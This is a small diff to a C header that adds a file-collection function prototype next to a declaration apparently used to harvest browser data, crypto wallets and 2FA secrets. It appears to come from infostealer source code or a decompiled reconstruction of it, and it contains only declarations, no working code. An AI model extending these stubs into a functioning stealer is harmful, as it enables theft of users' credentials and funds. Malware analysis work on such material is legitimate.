@@ -161,4 +161,10 @@ void __fastcall
 CryptoWallrtsAnd2FA(LPCWSTR *BrowserAllInfo, 
                     void ***SysInfo);
 
+int32_t __fastcall processPath(PWSTR fileExtension,
+                                int32_t searchPath,
+                                PWSTR destinationFolder,
+                                int32_t recursionDepth,
+                                int32_t** SysInfo);
+
 #endif
